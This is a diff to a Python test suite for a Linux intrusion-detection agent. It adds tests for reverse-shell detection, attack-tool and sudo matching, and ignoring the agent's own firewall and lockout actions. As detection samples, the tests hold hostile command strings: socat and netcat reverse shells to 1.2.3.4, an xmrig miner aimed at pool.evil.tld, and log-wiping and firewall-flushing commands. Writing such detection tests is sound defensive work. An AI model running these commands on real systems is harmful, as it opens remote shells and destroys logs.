@@ -205,13 +205,88 @@ def test_reverse_shell_patterns():
         "python3 -c import socket,subprocess",
         "socat TCP:1.2.3.4:9001 EXEC:/bin/bash",
         "mkfifo /tmp/f; cat /tmp/f | sh -i",
-        "chmod +x /tmp/linux-exploit",
+        "mkfifo /tmp/f; nc 1.2.3.4 4444 < /tmp/f | sh > /tmp/f",
     ]
     for cmd in bad:
         assert agent.REVERSE_SHELL_RE.search(cmd), cmd
     for cmd in ("/usr/sbin/nginx: worker process", "python3 aiboo_linux_agent.py",
                 "systemd-journald", "postgres: writer process"):
         assert not agent.REVERSE_SHELL_RE.search(cmd), cmd
+
+
+def test_a_reverse_shell_needs_a_network_step():
+    """A bare tool name is not a C2: these are normal Linux commands."""
+    for cmd in ("chmod +x /tmp/linux-exploit", "mkfifo /tmp/f",
+                "strip -g -p /usr/lib/libfoo.so", "cp --reflink=auto -fLp /usr/bin/x /usr/bin/y"):
+        assert not agent.REVERSE_SHELL_RE.search(cmd), cmd
+
+
+def test_ubuntu_kernel_update_is_not_an_attack():
+    """Real lines from the EC2 that were wrongly reported as reverse shells."""
+    for cmd in (
+        "strip -g -p /var/tmp/dracut.dxy0bhv/initramfs/usr/libexec/plymouth/plymouthd.default",
+        "cp --reflink=auto -fLp /usr/bin/../lib/cargo/bin/coreutils/coreutils /var/tmp/dracut.dxy0bhv/initramfs/usr/lib/cargo/bin/coreutils/coreutils",
+        "/usr/lib/dracut/dracut-install -D /var/tmp/dracut.dxy0bhv/initramfs -a -m -o -m 1 plymouth",
+        "cp --reflink=auto -dfrp -L -t /var/tmp/dracut.dxy0bhv/initramfs/usr/lib/firmware",
+        "chmod +x /var/tmp/dracut.dxy0bhv/initramfs/usr/lib/dracut/modules.d/90kernel-modules/module-setup.sh",
+        "/bin/sh -c mkfifo /var/tmp/dracut.dxy0bhv/initqueue-finished",
+        "dpkg -i /var/cache/apt/archives/linux-image-6.8.0-45-generic_6.8.0-45.46_amd64.deb",
+    ):
+        assert agent.is_maintenance_command(cmd), cmd
+        assert not agent.REVERSE_SHELL_RE.search(cmd), cmd
+        assert agent.find_tool_marker(cmd) == "", f"{cmd} matched tool {agent.find_tool_marker(cmd)}"
+
+
+def test_attack_tools_are_matched_as_whole_tokens_only():
+    assert agent.find_tool_marker("cp --reflink=auto -dfrp -L -t /var/tmp/x") == ""
+    assert agent.find_tool_marker("/tmp/.hidden/pspy64 -pf") == "pspy"
+    assert agent.find_tool_marker("xmrig -o pool.evil.tld:3333") == "xmrig"
+    assert agent.find_tool_marker("nmap -sS 10.0.0.0/24") == "nmap"
+    assert agent.find_tool_marker("/usr/bin/python3 /opt/app/main.py") == ""
+
+
+def test_sudo_matching_uses_whole_words():
+    # substring bugs that fired on a real server: "mount " inside "umount", and
+    # every package install because of the word "curl"/"python" inside the list
+    assert agent.find_suspicious_sudo("/usr/bin/umount /mnt/data") == ""
+    assert agent.find_suspicious_sudo("/usr/bin/fusermount3 -u /run/user/1000") == ""
+    assert agent.find_suspicious_sudo("/usr/bin/apt-get install -y curl") == ""
+    assert agent.find_suspicious_sudo("/usr/bin/dpkg -i /tmp/pkg.deb") == ""
+    assert agent.find_suspicious_sudo("/usr/bin/unattended-upgrade") == ""
+    # still caught: privilege / identity / firewall / log tampering
+    assert agent.find_suspicious_sudo("usr/bin/usermod -L bob") == "usermod"
+    assert agent.find_suspicious_sudo("/bin/bash -c whoami") == "bash"
+    assert agent.find_suspicious_sudo("iptables -F") == "iptables"
+    assert agent.find_suspicious_sudo("rm -rf /var/log/*") == "rm -rf /var/log"
+    assert agent.find_suspicious_sudo("/usr/sbin/chpasswd") == "chpasswd"   # password changes matter
+
+
+def test_the_agent_does_not_alert_on_its_own_response_actions():
+    """AiBoO reads the same logs it writes to - its own block/kill/lock must be ignored."""
+    eng, _ = engine(allow_response=True, response_dry_run=False)
+
+    class FakeState:
+        pass
+
+    state = FakeState()
+    state.engine = eng
+    # pretend a real action ran (dry-run must NOT count as "we did this")
+    eng.is_root = True
+    eng.dry = False
+    real_run = eng._run
+    import subprocess as _sp
+    class R:
+        returncode, stdout, stderr = 0, "", ""
+    _sp.run = lambda *a, **k: R()
+
+    eng._remember_ran(["iptables", "-I", "INPUT", "-s", "45.95.147.3", "-j", "DROP"])
+    assert agent.state_ran_recently(state, "/usr/sbin/iptables -I INPUT -s 45.95.147.3 -j DROP")
+    assert not agent.state_ran_recently(state, "/usr/sbin/iptables -F")
+
+    # and a dry-run engine is not remembered at all
+    eng2, _ = engine(allow_response=True, response_dry_run=True)
+    eng2._run(["usermod", "-L", "bob"])
+    assert getattr(eng2, "ran", []) == [], "dry-run commands must not be remembered"
 
 
 def test_running_reverse_shell_process_is_detected():
